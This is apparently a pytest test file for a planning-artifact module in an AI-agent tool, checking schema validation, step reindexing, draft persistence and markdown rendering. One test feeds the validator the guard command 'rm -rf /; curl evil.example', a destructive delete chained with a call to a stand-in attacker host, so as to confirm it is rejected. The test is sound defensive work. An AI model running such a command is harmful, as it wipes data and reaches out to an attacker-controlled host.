"""Tests for ralph/mcp/plan_artifact.py — structured planning artifact helpers."""

from __future__ import annotations

import json
from itertools import pairwise
from typing import TYPE_CHECKING, cast

import pytest

from ralph.mcp.artifacts.plan import (
    PlanArtifactValidationError,
    delete_plan_draft,
    extract_plan_skill_names,
    finalize_plan_draft,
    insert_plan_step,
    is_noop_plan,
    load_plan_draft,
    merge_plan_section,
    new_plan_draft,
    normalize_plan_artifact_content,
    remove_plan_step,
    render_plan_markdown,
    replace_plan_step,
    save_plan_draft,
    validate_plan_section,
)
from ralph.prompts.plan_format import format_plan_for_execution

if TYPE_CHECKING:
    from pathlib import Path


class FakeFileBackend:
    def __init__(self) -> None:
        self.files: dict[Path, str] = {}
        self.directories: set[Path] = set()

    def exists(self, path: Path) -> bool:
        return path in self.files or path in self.directories

    def mkdir(self, path: Path, *, parents: bool = False, exist_ok: bool = False) -> None:
        self.directories.add(path)

    def read_text(self, path: Path, *, encoding: str = "utf-8") -> str:
        return self.files[path]

    def write_text(self, path: Path, content: str, *, encoding: str = "utf-8") -> None:
        self.files[path] = content

    def replace(self, source: Path, destination: Path) -> None:
        self.files[destination] = self.files.pop(source)

    def unlink(self, path: Path, *, missing_ok: bool = False) -> None:
        self.files.pop(path, None)

    def glob(self, path: Path, pattern: str) -> list[Path]:
        return []


def _valid_skills_mcp() -> dict[str, object]:
    return {
        "skills": [
            "test-driven-development",
            "verification-before-completion",
        ],
        "mcps": [],
    }


def _valid_design_section() -> dict[str, object]:
    return {
        "constraints": {
            "text": "Design section must round-trip.",
            "invariants": ["design is optional", "sub-models reject extra keys"],
        },
        "non_goals": {"items": ["changing the step-wise submission protocol"]},
        "dependency_injection": {
            "required_for_testability": True,
            "preferred_patterns": ["constructor"],
            "forbidden_patterns": ["global-singleton"],
        },
        "drift_detection": {
            "guard_commands": ["ruff check ralph/"],
            "expected_outputs": ["All checks passed"],
            "sources": ["ruff"],
            "on_drift_action": "fail-verify",
        },
        "testability": {
            "must_be_black_box": True,
            "forbidden_in_tests": ["time.sleep"],
            "required_test_layers": ["unit"],
            "clock_injection_required": True,
            "max_unit_test_seconds": 1.0,
        },
        "refactor_strategy": {
            "approach": "incremental",
            "dead_code_policy": "delete-immediately",
            "allow_temporary_hacks": False,
        },
        "acceptance_criteria": {
            "criteria": [
                {"id": "AC-01", "description": "Round-trips through normalize"},
                {"id": "AC-02", "description": "All new tests pass"},
            ]
        },
    }


def _valid_plan() -> dict[str, object]:
    return {
        "summary": {
            "context": "Implement a robust MCP planning pipeline.",
            "scope_items": [
                {
                    "text": "Update planning validation",
                    "count": "2 files",
                    "category": "file_change",
                },
                {"text": "Add integration tests", "count": "3 tests", "category": "test"},
                {"text": "Tighten prompt contract", "count": "1 template", "category": "prompt"},
            ],
        },
        "skills_mcp": _valid_skills_mcp(),
        "steps": [
            {
                "number": 1,
                "step_type": "file_change",
                "priority": "high",
                "title": "Validate plan artifacts",
                "targets": [{"path": "ralph/mcp/tool_artifact.py", "action": "modify"}],
                "location": "plan artifact handler",
                "content": "Reject malformed plan artifacts before persistence.",
            }
        ],
        "critical_files": {
            "primary_files": [{"path": "ralph/mcp/tool_artifact.py", "action": "modify"}],
            "reference_files": [
                {"path": "ralph/prompts/templates/planning.jinja", "purpose": "prompt source"}
            ],
        },
        "risks_mitigations": [
            {
                "severity": "medium",
                "risk": "Prompt and server drift apart again.",
                "mitigation": "Add HTTP MCP integration tests for plan submission.",
            }
        ],
        "verification_strategy": [
            {
                "method": "pytest tests/test_mcp_server.py tests/test_plan_artifact.py",
                "expected_outcome": (
                    "Structured plan artifacts are accepted and malformed ones are rejected."
                ),
            }
        ],
    }


def test_normalize_plan_artifact_content_accepts_valid_plan() -> None:
    normalized = normalize_plan_artifact_content(_valid_plan())
    summary = cast("dict[str, object]", normalized["summary"])
    steps = cast("list[dict[str, object]]", normalized["steps"])

    assert summary["context"] == "Implement a robust MCP planning pipeline."
    assert steps[0]["targets"] == [{"path": "ralph/mcp/tool_artifact.py", "action": "modify"}]


def test_normalize_plan_artifact_content_rejects_missing_required_section() -> None:
    invalid = _valid_plan()
    invalid.pop("verification_strategy")

    with pytest.raises(PlanArtifactValidationError, match="verification_strategy"):
        normalize_plan_artifact_content(invalid)


def test_normalize_plan_artifact_content_rejects_invalid_step_type() -> None:
    invalid = _valid_plan()
    invalid["steps"] = [
        {
            "number": 1,
            "step_type": "ship_it",
            "title": "Invalid step",
            "content": "This should fail.",
        }
    ]

    with pytest.raises(PlanArtifactValidationError, match="step_type"):
        normalize_plan_artifact_content(invalid)


def test_normalize_plan_artifact_content_rejects_too_few_scope_items() -> None:
    invalid = _valid_plan()
    invalid["summary"] = {
        "context": "Missing enough scope detail.",
        "scope_items": [{"text": "Only one scope item"}],
    }

    with pytest.raises(PlanArtifactValidationError, match="scope_items"):
        normalize_plan_artifact_content(invalid)


def test_validate_plan_section_accepts_summary_object() -> None:
    summary = _valid_plan()["summary"]

    normalized = validate_plan_section("summary", summary)

    assert isinstance(normalized, dict)
    assert normalized["context"] == "Implement a robust MCP planning pipeline."


def test_validate_plan_section_rejects_summary_with_too_few_scope_items() -> None:
    with pytest.raises(PlanArtifactValidationError, match="scope_items"):
        validate_plan_section(
            "summary",
            {"context": "short", "scope_items": [{"text": "only one"}]},
        )


def test_validate_plan_section_steps_replace_mode_accepts_list() -> None:
    steps = _valid_plan()["steps"]

    normalized = validate_plan_section("steps", steps, mode="replace")

    assert isinstance(normalized, list)
    assert normalized[0]["title"] == "Validate plan artifacts"


def test_validate_plan_section_steps_replace_mode_rejects_single_object() -> None:
    steps = cast("list[dict[str, object]]", _valid_plan()["steps"])
    with pytest.raises(PlanArtifactValidationError, match="must be a JSON array"):
        validate_plan_section("steps", steps[0], mode="replace")


def test_validate_plan_section_steps_append_mode_accepts_single_item() -> None:
    step = cast("list[dict[str, object]]", _valid_plan()["steps"])[0]

    fragment = validate_plan_section("steps", step, mode="append")

    assert isinstance(fragment, dict)
    assert fragment["number"] == 1


def test_validate_plan_section_accepts_non_mutating_step_targets() -> None:
    fragment = validate_plan_section(
        "steps",
        {
            "number": 2,
            "title": "Inspect prior analysis feedback",
            "content": "Read the prior feedback and reference the prompt artifact.",
            "targets": [
                {"path": ".agent/PLANNING_ANALYSIS_DECISION.md", "action": "read"},
                {"path": ".agent/CURRENT_PROMPT.md", "action": "reference"},
            ],
        },
        mode="append",
    )

    assert isinstance(fragment, dict)
    assert fragment["targets"] == [
        {"path": ".agent/PLANNING_ANALYSIS_DECISION.md", "action": "read"},
        {"path": ".agent/CURRENT_PROMPT.md", "action": "reference"},
    ]


def test_validate_plan_section_work_units_append_mode_accepts_single_item() -> None:
    fragment = validate_plan_section(
        "work_units",
        {
            "unit_id": "api",
            "description": "Update API handlers",
            "allowed_directories": ["src/api/"],
            "dependencies": [],
        },
        mode="append",
    )

    assert isinstance(fragment, dict)
    assert fragment["unit_id"] == "api"


def test_validate_plan_section_rejects_unknown_section_name() -> None:
    with pytest.raises(PlanArtifactValidationError, match="unknown plan section"):
        validate_plan_section("bogus", {})


def test_validate_plan_section_object_rejects_append_mode() -> None:
    summary = _valid_plan()["summary"]
    with pytest.raises(PlanArtifactValidationError, match="only supports"):
        validate_plan_section("summary", summary, mode="append")


def test_validate_plan_section_rejects_invalid_step_type() -> None:
    with pytest.raises(PlanArtifactValidationError, match="step_type"):
        validate_plan_section(
            "steps",
            {"number": 1, "title": "x", "content": "y", "step_type": "ship_it"},
            mode="append",
        )


def test_merge_plan_section_replace_on_object_section() -> None:
    sections: dict[str, object] = {}
    fragment = {"context": "c", "scope_items": [{"text": "a"}, {"text": "b"}, {"text": "c"}]}

    merged = merge_plan_section(sections, "summary", fragment, "replace")

    assert merged == {"summary": fragment}


def test_merge_plan_section_append_extends_existing_list() -> None:
    first = {"number": 1, "title": "t1", "content": "c1"}
    second = {"number": 2, "title": "t2", "content": "c2"}

    merged = merge_plan_section({}, "steps", first, "append")
    merged = merge_plan_section(merged, "steps", second, "append")

    assert merged["steps"] == [first, second]


def test_insert_plan_step_reindexes_all_numbers() -> None:
    sections = _valid_plan()
    sections["steps"] = [
        {
            "number": 1,
            "title": "First",
            "content": "first content",
            "depends_on": [],
        },
        {
            "number": 2,
            "title": "Third",
            "content": "third content",
            "depends_on": [1],
        },
    ]

    updated = insert_plan_step(
        sections,
        index=2,
        step_payload={
            "number": 99,
            "title": "Second",
            "content": "second content",
            "depends_on": [1],
        },
    )

    assert [step["number"] for step in cast("list[dict[str, object]]", updated["steps"])] == [
        1,
        2,
        3,
    ]
    assert [step["title"] for step in cast("list[dict[str, object]]", updated["steps"])] == [
        "First",
        "Second",
        "Third",
    ]


def test_remove_plan_step_reindexes_numbers_and_dependency_targets() -> None:
    sections = _valid_plan()
    sections["steps"] = [
        {
            "number": 1,
            "title": "First",
            "content": "first content",
            "depends_on": [],
        },
        {
            "number": 2,
            "title": "Second",
            "content": "second content",
            "depends_on": [],
        },
        {
            "number": 3,
            "title": "Third",
            "content": "third content",
            "depends_on": [2],
        },
    ]

    updated = remove_plan_step(sections, step_number=1)
    steps = cast("list[dict[str, object]]", updated["steps"])

    assert [step["number"] for step in steps] == [1, 2]
    assert [step["title"] for step in steps] == ["Second", "Third"]
    assert steps[0].get("depends_on", []) == []
    assert steps[1].get("depends_on", []) == [1]


def test_remove_plan_step_rejects_when_other_steps_depend_on_removed_step() -> None:
    sections = _valid_plan()
    sections["steps"] = [
        {
            "number": 1,
            "title": "First",
            "content": "first content",
            "depends_on": [],
        },
        {
            "number": 2,
            "title": "Second",
            "content": "second content",
            "depends_on": [1],
        },
    ]

    with pytest.raises(PlanArtifactValidationError, match="depends on step 1"):
        remove_plan_step(sections, step_number=1)


def test_replace_plan_step_preserves_position_and_reindexes_number() -> None:
    sections = _valid_plan()
    sections["steps"] = [
        {
            "number": 1,
            "title": "First",
            "content": "first content",
            "depends_on": [],
        },
        {
            "number": 2,
            "title": "Second",
            "content": "second content",
            "depends_on": [1],
        },
    ]

    updated = replace_plan_step(
        sections,
        step_number=2,
        step_payload={
            "number": 99,
            "title": "Replacement",
            "content": "replacement content",
            "depends_on": [1],
        },
    )
    steps = cast("list[dict[str, object]]", updated["steps"])

    assert [step["number"] for step in steps] == [1, 2]
    assert steps[1]["title"] == "Replacement"
    assert steps[1]["depends_on"] == [1]


def test_finalize_plan_draft_accepts_complete_sections() -> None:
    draft = new_plan_draft()
    draft["sections"] = _valid_plan()

    normalized = finalize_plan_draft(draft)

    assert "summary" in normalized
    assert "steps" in normalized


def test_finalize_plan_draft_rejects_missing_required_section() -> None:
    draft = new_plan_draft()
    sections = _valid_plan()
    sections.pop("verification_strategy")
    draft["sections"] = sections

    with pytest.raises(PlanArtifactValidationError, match="verification_strategy"):
        finalize_plan_draft(draft)


def test_plan_draft_io_round_trip(tmp_path: Path) -> None:
    draft = new_plan_draft()
    draft["sections"] = {"summary": _valid_plan()["summary"]}

    save_plan_draft(tmp_path, draft)
    loaded = load_plan_draft(tmp_path)

    assert loaded is not None
    loaded_sections = cast("dict[str, object]", loaded["sections"])
    assert "summary" in loaded_sections


def test_load_plan_draft_returns_none_when_missing(tmp_path: Path) -> None:
    assert load_plan_draft(tmp_path) is None


def test_load_plan_draft_returns_none_on_corrupt_file(tmp_path: Path) -> None:
    (tmp_path / ".plan_draft.json").write_text("{not json", encoding="utf-8")
    assert load_plan_draft(tmp_path) is None


def test_delete_plan_draft_reports_whether_existed(tmp_path: Path) -> None:
    assert delete_plan_draft(tmp_path) is False
    save_plan_draft(tmp_path, new_plan_draft())
    assert delete_plan_draft(tmp_path) is True
    assert delete_plan_draft(tmp_path) is False


def test_plan_draft_io_uses_injected_backend_and_clock(tmp_path: Path) -> None:
    backend = FakeFileBackend()
    draft = new_plan_draft(now_iso=lambda: "START")
    draft["sections"] = {"summary": _valid_plan()["summary"]}

    save_plan_draft(tmp_path, draft, backend=backend, now_iso=lambda: "UPDATED")
    loaded = load_plan_draft(tmp_path, backend=backend)

    assert loaded is not None
    assert loaded["updated_at"] == "UPDATED"


def test_is_noop_plan_returns_true_for_explicit_flag() -> None:
    assert is_noop_plan({"noop": True}) is True


def test_is_noop_plan_returns_true_for_empty_lists() -> None:
    assert is_noop_plan({"steps": [], "work_units": []}) is True


def test_is_noop_plan_returns_false_for_malformed_empty_plan() -> None:
    # A dict missing steps entirely is malformed, not a deliberate noop.
    assert is_noop_plan({}) is False


def test_is_noop_plan_returns_false_for_plan_with_steps() -> None:
    assert is_noop_plan({"steps": [{"number": 1}], "work_units": []}) is False


def test_noop_plan_normalizes_to_noop_only() -> None:
    normalized = normalize_plan_artifact_content({"noop": True})
    assert normalized == {"noop": True}


def test_normalize_plan_artifact_content_rejects_missing_skills_mcp() -> None:
    invalid = _valid_plan()
    invalid.pop("skills_mcp")

    with pytest.raises(PlanArtifactValidationError, match="skills_mcp"):
        normalize_plan_artifact_content(invalid)


def test_normalize_plan_artifact_content_accepts_available_skill_names() -> None:
    plan = _valid_plan()
    plan["skills_mcp"] = {
        "skills": [
            "open-design--frontend-design",
            "my-custom-skill",
            "open-design--frontend-design",
        ],
        "mcps": [],
    }

    normalized = normalize_plan_artifact_content(plan)

    assert normalized["skills_mcp"]["skills"] == [
        "open-design--frontend-design",
        "my-custom-skill",
    ]


def test_normalize_plan_artifact_content_rejects_empty_skill_names() -> None:
    invalid = _valid_plan()
    invalid["skills_mcp"] = {"skills": ["   "], "mcps": []}

    with pytest.raises(PlanArtifactValidationError, match="skills must contain at least one"):
        normalize_plan_artifact_content(invalid)


def test_render_plan_markdown_includes_skills_mcp_section() -> None:
    markdown = render_plan_markdown(_valid_plan())

    assert "## Skills and MCPs" in markdown
    assert "### Skills" in markdown
    assert "`test-driven-development`" in markdown
    assert "`verification-before-completion`" in markdown


def test_extract_plan_skill_names_reads_enveloped_plan_payload() -> None:
    payload = {
        "type": "plan",
        "content": _valid_plan(),
    }

    assert extract_plan_skill_names(payload) == (
        "test-driven-development",
        "verification-before-completion",
    )


# ---------------------------------------------------------------------------
# Design section tests (Steps 4-6 of PLAN.md)
# ---------------------------------------------------------------------------


def test_design_section_accepts_fully_populated_payload() -> None:
    plan = {**_valid_plan(), "design": _valid_design_section()}
    normalized = normalize_plan_artifact_content(plan)
    design = cast("dict[str, object]", normalized["design"])

    for key in (
        "constraints",
        "non_goals",
        "dependency_injection",
        "drift_detection",
        "testability",
        "refactor_strategy",
        "acceptance_criteria",
    ):
        assert key in design, f"sub-section dropped: {key}"


def test_design_section_accepts_partial_sub_sections() -> None:
    plan = {
        **_valid_plan(),
        "design": {
            "testability": {
                "must_be_black_box": True,
                "forbidden_in_tests": [],
                "required_test_layers": [],
            }
        },
    }
    normalized = normalize_plan_artifact_content(plan)
    design = cast("dict[str, object]", normalized["design"])
    testability = cast("dict[str, object]", design["testability"])
    assert testability["must_be_black_box"] is True


def test_design_section_accepts_none_as_whole() -> None:
    plan = {**_valid_plan(), "design": None}
    normalized = normalize_plan_artifact_content(plan)
    assert "design" not in normalized


def test_design_section_rejects_unknown_sub_section_key() -> None:
    plan = {**_valid_plan(), "design": {"bogus": {"foo": "bar"}}}
    with pytest.raises(PlanArtifactValidationError, match="bogus"):
        normalize_plan_artifact_content(plan)


def test_design_section_rejects_empty_constraint_text() -> None:
    plan = {
        **_valid_plan(),
        "design": {"constraints": {"text": "   ", "invariants": []}},
    }
    with pytest.raises(PlanArtifactValidationError, match=r"text|min_length|string"):
        normalize_plan_artifact_content(plan)


def test_design_section_rejects_invalid_dependency_injection_pattern() -> None:
    plan = {
        **_valid_plan(),
        "design": {
            "dependency_injection": {
                "required_for_testability": True,
                "preferred_patterns": ["factory-of-factories"],
            }
        },
    }
    with pytest.raises(PlanArtifactValidationError, match=r"preferred_patterns|literal"):
        normalize_plan_artifact_content(plan)


def test_design_section_rejects_drift_detection_unsafe_command() -> None:
    plan = {
        **_valid_plan(),
        "design": {"drift_detection": {"guard_commands": ["rm -rf /; curl evil.example"]}},
    }
    with pytest.raises(PlanArtifactValidationError, match="guard_commands"):
        normalize_plan_artifact_content(plan)


def test_design_section_rejects_testability_forbidden_unknown_enum() -> None:
    plan = {
        **_valid_plan(),
        "design": {
            "testability": {
                "must_be_black_box": True,
                "forbidden_in_tests": ["SLEEP_FOREVER"],
            }
        },
    }
    with pytest.raises(PlanArtifactValidationError, match="forbidden_in_tests"):
        normalize_plan_artifact_content(plan)


def test_design_section_rejects_acceptance_criterion_bad_id_pattern() -> None:
    plan = {
        **_valid_plan(),
        "design": {
            "acceptance_criteria": {
                "criteria": [{"id": "a-1", "description": "no upper case"}]
            }
        },
    }
    with pytest.raises(PlanArtifactValidationError, match=r"id|pattern"):
        normalize_plan_artifact_content(plan)


def test_design_section_rejects_duplicate_acceptance_criterion_ids_case_insensitive() -> None:
    plan = {
        **_valid_plan(),
        "design": {
            "acceptance_criteria": {
                "criteria": [
                    {"id": "AC-01", "description": "first"},
                    {"id": "ac-01", "description": "duplicate of first"},
                ]
            }
        },
    }
    with pytest.raises(PlanArtifactValidationError, match=r"duplicate|id"):
        normalize_plan_artifact_content(plan)


def test_design_section_validate_plan_section_replace_mode_accepts_dict() -> None:
    fragment = validate_plan_section("design", _valid_design_section(), mode="replace")
    assert isinstance(fragment, dict)
    design = cast("dict[str, object]", fragment)
    assert "constraints" in design


def test_design_section_validate_plan_section_append_mode_rejected() -> None:
    with pytest.raises(PlanArtifactValidationError, match="only supports mode='replace'"):
        validate_plan_section("design", _valid_design_section(), mode="append")


def test_design_section_render_plan_markdown_lists_every_sub_heading() -> None:
    plan = {**_valid_plan(), "design": _valid_design_section()}
    markdown = render_plan_markdown(plan)

    sub_headings = [
        "### Design Constraints",
        "### Non-Goals",
        "### Dependency Injection",
        "### Drift Detection",
        "### Testability",
        "### Refactor Strategy",
        "### Acceptance Criteria",
    ]
    positions = [markdown.find(h) for h in sub_headings]
    missing = {h: p for h, p in zip(sub_headings, positions, strict=True) if p < 0}
    assert not missing, f"missing sub-heading: {missing}"
    for prev, nxt in pairwise(positions):
        assert prev < nxt, "sub-heading order broken"


def test_design_section_render_plan_markdown_omits_section_when_none() -> None:
    markdown = render_plan_markdown(_valid_plan())
    assert "## Design" not in markdown


def test_design_section_render_plan_markdown_includes_notes_when_provided() -> None:
    design = _valid_design_section()
    design["notes"] = "Additional free-form context"
    plan = {**_valid_plan(), "design": design}
    markdown = render_plan_markdown(plan)
    assert "### Notes" in markdown
    assert "Additional free-form context" in markdown


def test_noop_plan_with_no_design_still_validates() -> None:
    normalized = normalize_plan_artifact_content(_valid_plan())
    assert "design" not in normalized


def test_design_section_render_plan_markdown_preserves_section_order() -> None:
    plan = {
        **_valid_plan(),
        "design": _valid_design_section(),
        "parallel_plan": [
            {
                "id": "unit-a",
                "description": "Parallel unit A",
                "edit_area": {"paths": ["src/a/"], "directories": []},
                "depends_on": [],
            }
        ],
        "work_units": [
            {
                "unit_id": "wu-1",
                "description": "Work unit one",
                "allowed_directories": ["src/a/"],
                "dependencies": [],
            }
        ],
    }
    markdown = render_plan_markdown(plan)

    headings = [
        "## Summary",
        "## Skills and MCPs",
        "## Steps",
        "## Critical Files",
        "## Risks and Mitigations",
        "## Design",
        "## Verification",
        "## Parallel Plan",
        "## Work Units",
    ]
    positions = [markdown.find(h) for h in headings]
    missing = {h: p for h, p in zip(headings, positions, strict=True) if p < 0}
    assert not missing, f"missing heading: {missing}"
    for prev, nxt in pairwise(positions):
        assert prev < nxt, "order broken"


def test_plan_format_for_execution_includes_design_block() -> None:
    plan = {**_valid_plan(), "design": _valid_design_section()}
    rendered = format_plan_for_execution(json.dumps(plan))
    assert "Design" in rendered
    assert "Testability" in rendered
    risks_idx = rendered.find("Risks and mitigations:")
    design_idx = rendered.find("Design")
    verify_idx = rendered.find("Verification strategy:")
    assert risks_idx >= 0
    assert design_idx >= 0
    assert verify_idx >= 0
    assert risks_idx < design_idx < verify_idx
